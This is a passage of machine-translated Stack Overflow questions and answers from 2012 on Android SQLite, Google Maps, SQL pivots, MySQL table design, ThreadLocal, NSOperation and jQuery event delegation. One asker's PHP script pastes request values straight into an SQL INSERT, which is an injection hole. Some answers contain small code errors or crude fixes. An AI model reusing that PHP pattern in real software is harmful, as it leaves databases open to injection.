  }

  // Method is called during creation of the database
  @Override
  public void onCreate(SQLiteDatabase database) {
    FirstClass.onCreate(database);
  }

  // Method is called during an upgrade of the database,
  // e.g. if you increase the database version
  @Override
  public void onUpgrade(SQLiteDatabase database, int oldVersion,
      int newVersion) {
    FirstClass.onUpgrade(database, oldVersion, newVersion);
  } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:55:49.133

我不确定我是否正确，但是，如果您在您的 oUnUpgrade 方法中删除您的数据库，系统应该升级哪个 dab？我的意思是，如果您为您的数据库设置了一个新版本，它应该与以前的数据库相同，但只是更改而不是删除。

我有一个类似的案例，我保存了一些用户输入值，但每次我的应用程序崩溃时。所以我将版本设置为相同的整数（例如，对于旧数据库和新数据库，只有版本 1，旧版本不是版本 1，新版本不是版本 2），删除旧数据库并创建一个全新的数据库，其中包含所有新数据。这工作非常好......

## 编辑

上面的声明是为了更新，不是为了升级，对不起。但是现在，我查看了您的代码，是否有可能因为错误而没有创建数据库？我认为您忘记在 COLUMN_DESCRIPTION 之后设置一个点。这是我的编辑：

```
 private static final String DATABASE_CREATE = "create table " 
        + TABLE_TODO
        + "(" 
        + COLUMN_ID + " integer primary key autoincrement," 
        + COLUMN_CATEGORY + " text not null," 
        + COLUMN_SUMMARY + " text not null," 
        + COLUMN_DESCRIPTION
        + " text not null," //HERE YOU FORGOT COMMA
        + COLUMN_DATE + " date not null" //i have added the date column
        + ");"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T08:33:35.963

根据我的方法

@Override public void onUpgrade(SQLiteDatabase database, int oldVersion, int newVersion) { FirstClass.onUpgrade(database, oldVersion, newVersion); }

正在吸收问题。因为您只是升级版本而不是再次创建数据库。升级数据库后，您需要像对表所做的那样调用 onCreate。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-28T06:32:16.023

使用**onUpgrade()** 你只是删除表结构而不是整个数据库。

解决方案：

(1) 更新数据库时以编程方式删除您的应用程序。

(2) 您必须在您的手机中卸载您的应用程序并重新安装。

# javascript - 谷歌地图缩放，需要缩放附近没有发生的标记，而是缩放到中心点

> ID：13599398
> 
> 赞同：0
> 
> 时间：2012-11-28T06:50:06.187
> 
> 标签：javascript, google-maps

我正在尝试将我的谷歌地图缩放到我将标记推到地图上的地方....但是如果我增加地图中的缩放值，它会缩放到地图的中心点，而不是放置标记的地方......所以你能告诉我......我哪里错了......！我尝试了很多方法，比如 map.setzoom 和所有方法来增加我推标记的地方附近的缩放，但它缩放到中心点......请帮忙！这是javascript：

```
 function init() {
        var answers = new Array();
        var data = document.getElementById('Hidden1').value;

        var pairs = data.split('@');
        for (var i = 0; i < pairs.length - 1; i++) {
            var pair = pairs[i];
            var pairs1 = pair.split(',');
            answers[i] = pairs1;
        }

        var locations = answers;

        var map = new google.maps.Map(document.getElementById('map'), {
            zoom: 1,
            center: new google.maps.LatLng(12.9715987, 77.5945627),
            mapTypeId: google.maps.MapTypeId.ROADMAP
        });

        var infowindow = new google.maps.InfoWindow();

        var marker, i;

        for (i = 0; i < locations.length; i++) {

            marker = new google.maps.Marker({
                position: new google.maps.LatLng(locations[i][1], locations[i][2]),
                map: map
            });

            google.maps.event.addListener(marker, 'click', (function(marker, i) {
                return function() {
                    infowindow.setContent(locations[i][0]);
                    infowindow.open(map, marker);
                }
            })(marker, i));
        }
        map.setZoom(14);
        document.getElementById('dvloading5').style.display = 'none';
        document.getElementById('map').style.display = 'block';
    } 
```

我在其中显示地图的 div 很小......代码如下：

```
 <div id="map" style="width: 485px; height: 450px">
    </div> 
```

是因为地图的 div 尺寸小导致缩放不正确吗？或代码问题请告诉我...！提前谢谢你！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:36:29.113

您应该使用`google.maps.LatLngBounds()`来获取功能。

创建一个边界变量-

```
var bounds = new google.maps.LatLngBounds(); 
```

然后在您的循环中（*为清楚起见进行了修改*）-

```
for (i = 0; i < locations.length; i++) 
  {
      var lat = parseFloat(locations[i][1]);
      var lng = parseFloat(locations[i][2]);
      var pos = new google.maps.LatLng(lat, lng);
      marker = new google.maps.Marker({position: new google.maps.LatLng(pos),map: map});
      bounds.extend(pos);
   }
 map.fitBounds(bounds); 
```

# sql - 行成列

> ID：13599404
> 
> 赞同：0
> 
> 时间：2012-11-28T06:50:19.320
> 
> 标签：sql, sql-server, sql-server-2005, pivot

这是我的查询

```
 select * from dbo.tblHRIS_ChildDetails where intSID=463 
```

输出：

```
 intCHID  intsid nvrchildname  nvrgender      dttchildDOB                   Occupation 
        3      463     SK           Female     2001-12-11 00:00:00.000  Studying    
        4      463     SM            Male      2007-10-08 00:00:00.000  Student 
```

我需要这样的输出这是查询是动态的它可能会根据 intSID 返回 n 行

```
chidname1   gender  DOB   childoccupation1           chidname2  gender  DOB childoccupation2 
  SK     female  2001-12-11 00:00:00.000  studying     SM        Male   2007-10-08 00:00:00.000     Student 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T10:25:25.553

对于这种类型的数据，您将需要实现SQL Server`UNPIVOT`的功能和`PIVOT`功能。从多列中`UNPIVOT`获取数据并将其放入两列，然后应用将`PIVOT`数据转换回列。

如果您知道要转换的所有值，则可以对其进行硬编码，如下所示：

```
select *
from
(
  select value, col+'_'+cast(rn as varchar(10)) col
  from
  (
    select nvrchildname,
      nvrgender,
      convert(varchar(10), dttchildDOB, 120) dttchildDOB,
      occupation,
      row_number() over(partition by intsid order by intCHID) rn
    from tblHRIS_ChildDetails
    where intsid = 463
  ) src
  unpivot
  (
    value 
    for col in (nvrchildname, nvrgender, dttchildDOB, occupation)
  ) unpiv
) src1
pivot
(
  max(value)
  for col in ([nvrchildname_1], [nvrgender_1], 
              [dttchildDOB_1], [occupation_1], 
              [nvrchildname_2], [nvrgender_2], 
              [dttchildDOB_2], [occupation_2]) 
) piv 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/f54c9/9)

现在，如果您有未知数量的值要转换，那么您可以为此使用动态 SQL：

```
DECLARE @colsUnpivot AS NVARCHAR(MAX),
    @query  AS NVARCHAR(MAX),
    @colsPivot as  NVARCHAR(MAX)

select @colsUnpivot = stuff((select ','+quotename(C.name)
         from sys.columns as C
         where C.object_id = object_id('tblHRIS_ChildDetails') and
               C.name not in ('intCHID', 'intsid')
         for xml path('')), 1, 1, '')

select @colsPivot = STUFF((SELECT  ',' 
                      + quotename(c.name 
                         +'_'+ cast(t.rn as varchar(10)))
                    from 
                    (
                      select row_number() over(partition by intsid order by intCHID) rn
                      from tblHRIS_ChildDetails
                    ) t
                    cross apply sys.columns as C
                   where C.object_id = object_id('tblHRIS_ChildDetails') and
                         C.name not in ('intCHID', 'intsid')
                   group by c.name, t.rn
                   order by t.rn
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'')

set @query 
  = 'select *
      from
      (
        select col+''_''+cast(rn as varchar(10)) col, value
        from 
        (
          select nvrchildname,
            nvrgender,
            convert(varchar(10), dttchildDOB, 120) dttchildDOB,
            occupation,
            row_number() over(partition by intsid order by intCHID) rn
          from tblHRIS_ChildDetails
          where intsid = 463
        ) x
        unpivot
        (
          value
          for col in ('+ @colsunpivot +')
        ) u
      ) x1
      pivot
      (
        max(value)
        for col in  ('+ @colspivot +')
      ) p'

exec(@query) 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/f54c9/17)

两个查询的结果是：

```
| NVRCHILDNAME_1 | NVRGENDER_1 | DTTCHILDDOB_1 | OCCUPATION_1 | NVRCHILDNAME_2 | NVRGENDER_2 | DTTCHILDDOB_2 | OCCUPATION_2 |
-----------------------------------------------------------------------------------------------------------------------------
|             SK |      Female |    2001-12-11 |     Studying |             SM |        Male |    2007-10-08 |      Student | 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:08:44.163

您必须提供不同的列名，但除此之外，它很简单。但正如其他人所说，这并不常见，看起来如果你想打印一些包含两列的报告。

```
select 
  max(case when intCHID=1 then nvrchildname end) as chidname1,
  max(case when intCHID=1 then gender      end) as gender1,
  max(case when intCHID=1 then dttchildDOB end) as DOB1,
  max(case when intCHID=1 then Occupation  end) as cildOccupation1,
  max(case when intCHID=2 then nvrchildname end) as chidname2,
  max(case when intCHID=2 then gender      end) as gender2,
  max(case when intCHID=2 then dttchildDOB end) as DOB2,
  max(case when intCHID=2 then Occupation  end) as cildOccupation2
from 
  dbo.tblHRIS_ChildDetails 
where 
  intSID=463 
```

# ruby-on-rails - 通过 mailchimp api 发送通知邮件

> ID：13599407
> 
> 赞同：0
> 
> 时间：2012-11-28T06:50:36.170
> 
> 标签：ruby-on-rails, ruby-on-rails-3

我想通过 mailchimp 发送电子邮件通知。

我阅读了文档并编写了一些代码，以便通过以下方式获取列表`api.lists`：

```
$LOAD_PATH.unshift(File.join(File.dirname(__FILE__), '..', 'lib'))
$LOAD_PATH.unshift(File.dirname(__FILE__))
require 'mailchimp'
@options = ["list_id" => "$list_id", "subject" => "test subject", "from_name" => "test name", "from_email" => "info@example.com"]
@content = ["html" => "<p> test content </p>"]
@type = 'regular'
@title = 'Test Newsletter Title'        
api = Mailchimp::API.new("key")
puts "Your lists:"
api.lists['data'].each do |list|
  puts "\t #{list['name']}"
end 
```

**campaignCreate：** 我创建了一个这样的广告系列：

```
api.campaignCreate(@type, @title, @content) 
```

当我使用上述方法创建广告系列时，我收到以下错误：`wrong number of arguments (4 for 2)`

我想发送通知电子邮件。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T07:40:26.370

我做到了，使用这个

```
 $LOAD_PATH.unshift(File.join(File.dirname(__FILE__), '..', 'lib'))
 $LOAD_PATH.unshift(File.dirname(__FILE__))
 require 'mailchimp'
 api = Mailchimp::API.new("api-key")
 @content =  {"html"=>"<p> test content </p>","text"=> "test"}
 api.lists['data'].each do |list|
   @options =  {"list_id"=> list['id'], "subject"=>"test subject", "from_name"=>"test name", "from_email"=>"xyz@test.net", "template_id" => "xxxx"}
   campaign = api.campaignCreate({"type"=>"regular", "options" => @options, "content"=> @content})
   api.campaignSendNow({"cid" => campaign})
 end 
```

# c# - 打印没有打印对话框的条形码

> ID：13599411
> 
> 赞同：1
> 
> 时间：2012-11-28T06:50:54.173
> 
> 标签：c#, javascript, asp.net

我想使用 code-128 创建一个条形码，而不在表单上显示它。我想打印它而不通过客户端的条形码打印机显示打印对话框。我能够创建条形码，我已将其存储在隐藏的 div 中，但如何进一步进行？如何使用 JavaScript 或 C# 实现这一点？

另外，如何在代码中设置高度、宽度参数？？

# ruby-on-rails - 带有 Rails 框架的 XML

> ID：13599415
> 
> 赞同：1
> 
> 时间：2012-11-28T06:51:10.507
> 
> 标签：ruby-on-rails, xml, ruby-on-rails-3, xml-parsing

我想使用 xml 文件并读取此类 xml 文件的内容以查看。我不知道 xml 文件在 rails 框架中的位置在哪里。请建议我在rails框架中xml文件的合适目录在哪里，如何用rails读取xml以及如何将这个xml内容解析为ruby hash？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:22:32.097

你可以试试[Nokogiri](http://nokogiri.org/)。请参阅此[Railscasts](http://railscasts.com/episodes/190-screen-scraping-with-nokogiri)视频。

# mysql - MySQL 表 - 设计高效的表

> ID：13599418
> 
> 赞同：1
> 
> 时间：2012-11-28T06:51:18.060
> 
> 标签：mysql, sql, database, database-design

我正在设计一个数据库表，它将保存用户最喜欢的食物列表。我使用以下架构创建了最喜欢的表

```
id, user_id, food_id 
```

user_id 和 food_id 将是链接到另一个表的外键。

我只是想知道这是否有效且可扩展，因为如果用户有多个最喜欢的东西，那么它将需要多行数据。

即用户有 5 个最喜欢的食物，那么它将包含五行来保存该用户的列表。

这有效率吗？和可扩展？优化此架构的最佳方法是什么？

提前谢谢！！！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-28T07:20:11.977

tldr; **这称为[“连接表”](http://en.wikipedia.org/wiki/Junction_table) ，是在关系数据库中对 MM 关系建模的正确且*可扩展的方法。***（根据使用的约束，它还可以在“无 NULL FK”模式中建模 1-M/1-1 关系。）

但是，我认为此处*应省略**该`id`*列，以便该表*仅为* `user_id, food_id`. PK将`(user_id, food_id)`在这种情况下。

与其他表不同，有时会争论[代理（又称自动增量）PK](http://en.wikipedia.org/wiki/Surrogate_key)，代理 PK 通常只会在连接表中增加混乱，因为它具有非常自然的复合 PK。

虽然在这种情况下 PK 本身是复合的，但每个“连接”表仅与 PK 的一部分相关联。根据执行的查询，在`food_id`or上添加覆盖索引也可能是有益的`(food_id, user_id`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T12:09:29.033

**消除代理键：**除非您对代理键有[特定原因](https://stackoverflow.com/a/13177497/533120)`id`，否则将其从表中排除。

**微调索引：**此时，您只有一个复合主键，它是两个外键的组合。PK 字段应该按什么顺序排列？

*   如果您的应用程序主要执行诸如“给定用户，给我食物”之类的查询，那么 PK 应该是`{user_id, food_id}`.
*   如果主要查询是“给定食物，给我用户”，那么 PK 应该是`{food_id, user_id}`.
*   如果两个查询“方向”都是通用的，则添加一个与 PK 具有相同字段但方向相反的 UNIQUE INDEX。因此，您将在 PK 上打开`{user_id, food_id}`索引并在`{food_id, user_id}`.

请注意，[InnoDB 表是 clustered](http://www.ovaistariq.net/521/understanding-innodb-clustered-indexes/)，这消除了（在这种情况下是“不必要的”）表堆。然而，上面讨论的二级索引不会导致双重查找（因为它完全[覆盖](http://use-the-index-luke.com/sql/glossary/covering-index)了查询），也不会隐藏 PK 字段的开销（因为它索引与 PK*相同*的字段，只是顺序相反）。

有关设计接线表的更多信息，请查看[这篇文章](https://stackoverflow.com/a/13549395/533120)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T10:34:06.923

在我看来，您可以通过以下方式优化您的表格：

1.  作为具有 2 个前键的关系表，您不必使用“id”字段。
2.  在你的桌子上使用“innodb”引擎
3.  将您的关系表命名为“user_2_food”，这样会更清楚。
4.  尝试使用尽可能小的数据类型，即“smallint”优于“int”，并且不要忘记“UNSIGNED”属性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-28T06:55:04.520

创建以下三个表将产生有效的设计。

```
users : userId, username, userdesc
foods : foodId, foodname, fooddesc
userfoodmapping : ufid, userid, foodid, rowstate 
```

rowstate 的意义在于，如果将来用户不喜欢那个食物，它的 state 会变成 -1

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T06:56:49.907

在我的选择中，您有 2 个选项：

1.  摆脱 ID 字段，但在这种情况下，将其他键（组合）设为主键

2.  将您的 ID 键作为表的主键。

无论哪种情况，我认为这是一种适当的方法。一旦遇到效率低下的问题，您可能会考虑如何加载表的一部分或任何其他技术。现在就可以了。

# jquery - 触摸滑动返回距离X

> ID：13599423
> 
> 赞同：2
> 
> 时间：2012-11-28T06:51:45.640
> 
> 标签：jquery, touch, swipe

我使用 TouchSwipe (http://labs.skinkers.com/touchSwipe/)。我的问题是 swipeStatus 事件回调中的距离是两点之间的距离（开始拖动点和当前拖动点）。我只想分别获得 x 距离或 y 距离。怎么做？

```
swipeStatus: function(event, phase, direction, distance) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-10T07:37:19.210

您可以从事件参数中获取 x 和 y 坐标。对于刷卡，即：

```
event.pageX
event.pageY 
```

快乐编码！

# android - android - 禁用线性布局子项上的点击事件

> ID：13599426
> 
> 赞同：1
> 
> 时间：2012-11-28T06:52:11.567
> 
> 标签：android, onclicklistener

我有一个类似于视图容器的 LinearLayout。

我正在以编程方式膨胀不同的布局并添加 OnClickListener 并将其添加到我的 LinearLayout 中。

我想要实现的是可以选择在我已经膨胀并添加到我的 LinearLayout 的那些视图上禁用那些 OnClickListener。

我可以只禁用父 LinearLayout 上的 OnClickListener 以禁用所有其他孩子的 OnClickListener 吗？

将父 LinearLayout 单击侦听器设置为 null 不起作用，有什么想法吗？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:56:33.383

您可以将 onClickListener 设置为 null 到您不想为其添加侦听器的视图，而不是将侦听器设置为 null 到父布局。

# java - 回调中的线程本地使用

> ID：13599434
> 
> 赞同：3
> 
> 时间：2012-11-28T06:52:31.413
> 
> 标签：java, multithreading, thread-local

当我多次遇到 Joshua Bloch 的以下声明时，我正在阅读 ThreadLocal 类。

通过您无法控制的回调“偷窃”值：有时您必须调用一个回调到您的包中的库方法。此时，您需要一些由于库中的缺陷而无法传递给自己的上下文。在这种罕见的情况下，线程本地人可以成为救命稻草。

很难理解这个..如果有人能详细说明和解释，将不胜感激

谢谢..海娜

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T07:16:53.180

我的应用程序调用一个搜索存储数据的库。

该库还有一个您可以实现的接口，告诉它如何将搜索的原始结果转换为您想要的数据格式。

我如何将搜索结果转换为我想要的对象的实现涉及了解特定时区。

所以过程是，（A）我调用库搜索方法，（B）搜索方法然后调用我的另一段将原始结果转换为我的格式的代码，（C）我的转换需要知道一个时区。挑战是如何使我在 A 点知道的信息（时区）在 C 点可用？

显然，该库提供的方法不包括传递时区，所以我把它放在 ThreadLocal 中！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:24:20.880

假设您调用了第三方函数，该函数稍后会回调您的代码。在您的回调中，您需要一些上下文，即能够访问您的某些变量。但是，第三方函数的不足之处在于它无法通过他们的代码将对象引用传递到您的回调中。

你要做什么？

不幸的是，除了将上下文存储在一个有效的全局变量中（哦，太可怕了！）之外，您并没有太多选择。`ThreadLocal`是对全局变量的轻微改进，因为使用此 hack 的多个线程不会互相影响。

当然，如果回调发生在与调用第三方函数的线程不同的线程上，这种技术就会失效。

此外，这种技术无法扩展。如果同时注册两个回调，则需要两个不同的回调函数和两个不同的全局上下文。

# youtube - 如何使用 Metro 代码登录 Youtube

> ID：13599435
> 
> 赞同：1
> 
> 时间：2012-11-28T06:52:30.687
> 
> 标签：youtube, microsoft-metro

我正在使用 Gdata API 在 Win8 中以桌面模式登录 Youtube。

现在我有一个关于在 Win8 的 Metro 模式下使用 VS2012 和 C# 登录 Youtube 的问题。

任何人都可以提供提示，或告诉我如何做到这一点？

我不知道如何在 Win8 中以 Metro 模式登录 Youtube。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-06T16:47:58.340

我自己没有这样做，但 Leon Cullen 有一篇关于如何在 WinRT 上使用 OAuth 进行身份验证的文章，[在 WinRT 中使用 C# 使用 OAuth 2](http://leoncullens.nl/post/2012/09/26/Using-OAuth-2-in-WinRT-using-Csharp-it-has-never-been-easier-before.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-06T16:59:30.410

不幸的是，GData API[目前与 Windows 8 Metro 应用程序不兼容](https://code.google.com/p/google-gdata/issues/detail?id=620)。但是，如果您有足够的时间，您可以[在此处](https://code.google.com/p/google-gdata/)获取他们的源代码副本，并从中提取运行 WinRT 应用程序所需的内容。

编辑：这是一个演示如何连接到 OAuth 客户端的示例项目： [Web Authentication Broker Sample](http://code.msdn.microsoft.com/windowsapps/Web-Authentication-d0485122)

如果您希望使用单独的 API 来为您处理此问题，则有一些处于不同的开发阶段：

[Chq.OAuth](https://github.com/myquay/Chq.OAuth)

[Metro OAuth 实用程序](http://metrooauth.codeplex.com/releases/view/91224)

# php - 从mysql数据库中检索android中的数据

> ID：13599437
> 
> 赞同：0
> 
> 时间：2012-11-28T06:52:34.180
> 
> 标签：php, android, mysql, android-maps

我有一个 android 应用程序，它将使用 php 脚本将位置信息（纬度和经度值）发送到 mysql 数据库。

以下是我的 php 脚本：

```
<?php
    ob_start();

    $host="localhost"; // Host name 
    $username=""; // Mysql username 
    $password=""; // Mysql password 
    $db_name="test"; // Database name 
    $tbl_name="map"; // Table name 

    $message=$_POST['a'];
    $message1=$_POST['b'];

    mysql_connect("$host", "$username", "$password")or die("cannot connect"); 
    mysql_select_db("$db_name")or die("cannot select DB");

    $query = "INSERT INTO map(id,longitude,latitude)VALUES(DEFAULT,'".$_REQUEST['message']."', '".$_REQUEST['message1']."')";
    mysql_query($query) or die(mysql_error("error"));
    mysql_close();
?> 
```

MySQL数据库有以下文件，

```
+----+----------+-----------+
| id | latitude | longitude |
+----+----------+-----------+ 
```

这些东西很好用。

我的问题是“我需要使用 android 应用程序从 MYSQL（纬度和经度值）中检索表值。

从这些纬度和经度值中，我需要使用 android 地图绘制地图来追踪我旅行的位置。

在数据库中存储值工作正常。我需要帮助/想法来从数据库中检索数据并在 android 中使用它来绘制地图。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:13:56.103

嘿，为什么不编写 Web 服务来读取 MySQL 数据库。您可以使用[PHP 编写 webservice](http://www.phpzag.com/web-service-using-php-mysql-xml-and-json/)。

并且可以使用[kSOAP 库](http://code.google.com/p/ksoap2-android/)来消费 JSON webservice。如果您无法开始使用该库，请使用[本指南。](http://seesharpgears.blogspot.com/2010/11/basic-ksoap-android-tutorial.html)

祝你好运。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T07:07:13.727

通过 Android 从 MYSQL 读取数据不是一个好主意。请为此使用网络服务。您可以将 Resful webservice 与 JSON 数据一起使用（php 中的 webservice，而 JSON 将在 Android 中使用）。

# django - django中范围内的整数输入

> ID：13599439
> 
> 赞同：1
> 
> 时间：2012-11-28T06:52:45.220
> 
> 标签：django, html, input

我的 django 模型需要一个应该有输入的字段，整数 1 到 10。我将其建模如下

```
class Review(model):
    ...
    rating = models.IntegerField(default=5,help_text='value 1 to 10') 
```

我正在提供用于创建和编辑评论的表格，如下所示

```
class ReviewForm(ModelForm):    
    class Meta:
        model=Review
    ...

class ReviewEditForm(ModelForm):    
    class Meta:
        model=Review
    .... 
```

我应该怎么做才能确保用户输入一个整数 1 到 10 ..我应该用干净的表单方法检查这个吗？或者，还有更好的方法？

理想情况下，我想将该字段显示为 html5 中可用的滑块（`RangeInput`我认为），显示为`slider`in`chrome`和`textfield`in `firefox16.0.2ubuntu`。但我不知道如何在没有 javascript 的情况下做到这一点

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:04:17.057

您可以使用 django 验证器来完成这项工作

```
from django.core.validators import *

rating = models.IntegerField(default=5, help_text='value 1 to 10', validators=[MaxValueValidator(10),
            MinValueValidator(1)]) 
```

# php - EPUB 到 PDF 转换使用 calibre 给出错误

> ID：13599443
> 
> 赞同：0
> 
> 时间：2012-11-28T06:53:15.513
> 
> 标签：php, linux, cakephp-1.3, calibre

以下是我在使用代码时遇到的错误

```
$output = shell_exec("/usr/bin/ebook-convert test.epub mech4eck.pdf");
<br>echo $output; 
```

我只需要用 PHP 运行它，所以我正在尝试执行 shell 命令。我正在使用 Ubuntu 12。

> 没有使用临时目录而不是 /opt/lampp/lib/libgcc_s.so.1 对 /root/.config/calibre 进行写入访问：`GCC_4.2.0' not found (required by /usr/lib/i386-linux-gnu/libstdc++.so.6) /opt/lampp/lib/libgcc_s.so.1: version`未找到版本 GCC_4.2.0'（/usr/lib/i386-linux-gnu/ 需要libstdc++.so.6) 1% 正在将输入转换为 HTML... InputFormatPlugin: EPUB Input running on /opt/lampp/htdocs/test.epub 找到 HTML cover content/calibre_title_page.html 正在解析所有内容... 34% 正在运行转换电子书...合并用户指定的元数据...检测结构...扁平化 CSS 和重新映射字体大小...源基本字体大小为 12.00000pt 删除假边距...清理清单...从清单中修剪未使用的文件。 .. 创建 PDF 输出... 67% 创建 PDF 输出

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-29T06:04:03.447

我知道这里没有任何帮助，但我自己想通了。

这是诀窍

```
Rename the file /opt/lampp/lib/libgcc_s.so.1 to /opt/lampp/lib/libgcc_s.so.1.bak

Taddda it works :) 
```

# objective-c - 非并发 nsoperation 是否以串行方式执行？

> ID：13599444
> 
> 赞同：1
> 
> 时间：2012-11-28T06:53:30.983
> 
> 标签：objective-c, multithreading, parallel-processing, nsoperation

来自：[Apple docs on management concurrency](https://developer.apple.com/cocoa/managingconcurrency.html)：

> **Ns操作**
> 
> 编写一个自定义子类并覆盖一个方法：main。当 NSOperationQueue 调度它运行时，调用 main 方法来执行操作。以这种方式编写的 NSOperation 类称为非并发操作，因为开发人员不负责产生线程——多线程全部由超类处理。（不要被术语混淆：仅仅因为一个操作是非并发的，并不意味着它不能同时执行，它只是意味着你不必自己处理并发。）

我认为覆盖 main 是最简单的使用方法`NSOperation`，但苹果网站说它的非并发是否意味着 nsoperation 队列中的 nsoperations（仅覆盖 main 时）将连续执行？

我不想连续执行我的操作，但我希望以尽可能少的努力让我的操作并行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:05:11.970

不，它们*不一定*会连续运行。正如您引用的段落所指出的那样，它“并不意味着它不能同时执行”。

那么是什么决定了它们是否可以并行运行呢？`NSOperationQueue`您在操作之间设置的和任何依赖项。稍后在同一份文档中，标题为“运行操作”的部分解释了：

*   您可以指定（限制）队列将产生的线程数，并且
*   “NSOperationQueue 将自动确定它应该产生多少线程。”

在[并发编程指南](http://developer.apple.com/library/mac/#documentation/General/Conceptual/ConcurrencyProgrammingGuide/OperationObjects/OperationObjects.html)中详细说明：

> 在大多数情况下，操作在添加到队列后不久就会执行，但操作队列可能会由于多种原因延迟排队操作的执行。具体来说，如果排队的操作依赖于尚未完成的其他操作，则执行可能会延迟。如果操作队列本身已挂起或已在执行其最大数量的并发操作，则执行也可能会延迟。

您通过使用非并发操作放弃的是操作本身并不打算设置新线程等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:03:22.437

我不确定，但我正在使用“dispatch_queue_create”来创建并行进程。假设如果我想同时执行两个功能，我正在使用以下代码。看看能不能帮到你

```
dispatch_queue_t queue = dispatch_queue_create("FirstOperation", 0ul);
dispatch_async(queue, ^{

    //Do your functionality here

    dispatch_sync(dispatch_get_main_queue(), ^{
        //Do your UI updates here
    });
});
dispatch_release(queue);

dispatch_queue_t queue2 = dispatch_queue_create("SecondOperation", 0ul);
dispatch_async(queue2, ^{

    //Do your functionality here

    dispatch_sync(dispatch_get_main_queue(), ^{
        //Do your UI updates here
    });
});
dispatch_release(queue2); 
```

# javascript - 想要使用 jQuery 的“委托”功能而不是在此代码中单击...无法这样做...

> ID：13599445
> 
> 赞同：-1
> 
> 时间：2012-11-28T06:53:36.163
> 
> 标签：javascript, jquery, html, delegates, click

为了加快应用程序的速度，我尝试使用委托功能而不是点击功能......但由于某些原因，我什至无法进入该功能......

有什么帮助吗？？

这是代码：

```
 <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1"> 
            <link rel="stylesheet" href="css/checkbox.css"/>
            <link rel="stylesheet" href="css/jquery.mobile-1.1.1.css" />

        <title>Subscribe</title>
        <script src="scripts/jquery-1.8.2.min.js"></script>
        <script src="scripts/jquery.mobile-1.2.0.min.js"></script>

        <script type="text/javascript">
            $(document).ready(function() {

**Want to use Delegate instead of Click**
                   $('#selectAllTechAreas').click(function(){
                    //alert('aaa');
                      $('.techAreasCheckBox').attr('checked', true);
                    }); // Tech Areas Select All click function

                    $('#selectAllAssetTypes').tap(function(event){
                            $('.assetTypeCheckBox').attr('checked', true);
                    }); // Asset Types Select All click function
                    $('#clearAllSelections').click(function(){
                        $('.assetTypeCheckBox').attr('checked', false);
                        $('.techAreasCheckBox').attr('checked', false);
                    });
            }); // document
        </script>

    </head>

    <body>

        <div data-role="content" class="contentGrayBg">
            <div id="categoriesTable">
                </table>
                <br>

                <div class="container">
                        <div class="floatLeft">
                                <table id="technologyAreas">
                                    <tr>
                                        <td>
                                            <fieldset id="techAreasCB" data-role="controlgroup">
                                            <legend style="font-style: bold; font-size:16px">Technology Areas:</legend>
                                                <table>
                                                    <tr>
                                                        <td><input type="checkbox" data-mini="true" name="checkbox1" id="checkbox1" class="case techAreasCheckBox" /></td>
                                                        <td style="padding-left: 40px">SAP</td>
                                                    </tr>
                                                    <tr>
                                                        <td><input type="checkbox" data-mini="true" name="checkbox2" id="checkbox2" class="case techAreasCheckBox" /></td>
                                                        <td style="padding-left: 40px">Oracle</td>
                                                    </tr>

                                                    <tr>
                                                        <td><!-- <input type="checkbox" id="selectAllTechAreas"/> --></td>
                                                        <td >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<label id="selectAllTechAreas" style="color: orange; padding-left: 10px"><b>Select All</b></label></td>
                                                    </tr>
                                                </table>        
                                            </fieldset>
                                        </td>
                                    </tr>
                                </table>
                        </div>  <!-- Div Class Float Left -->

                </div>
            </div>
        </div> 

    </body>
    </html> 
```

谢谢，安基特。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T07:00:44.180

出于一般性目的，我假设您要委托给文档：

```
$(document).on('click','#selectAllTechAreas',function(){
        $('.techAreasCheckBox').attr('checked', true);
        // ...
}); 
```

一般来说，遵循的模式是：

```
$(document).on('click','#selectAllTechAreas',function(){
-----------    -------  -------------------  -----------
     |            |               |                |
element you     event  selector that specifies  your handler
want to          type    which elements to
delegate to             fire the handler for 
```

在这里要明确一点，我不主张您将处理程序委托给文档，甚至委托给任何祖先，因为您的目标是单个元素（特别是因为您似乎并不完全清楚委托的效用）。我建议阅读[这篇文章](http://davidwalsh.name/event-delegate)以更好地处理该主题。

要详细说明委托背后的动机，以及为什么将事件委托给单个元素毫无意义，请考虑以下几点：

```
<ul id="parent-list">
  <li id="post-1">Item 1</li>
  <li id="post-2">Item 2</li>
  <li id="post-3">Item 3</li>
  <li id="post-4">Item 4</li>
  <li id="post-5">Item 5</li>
  <li id="post-6">Item 6</li>
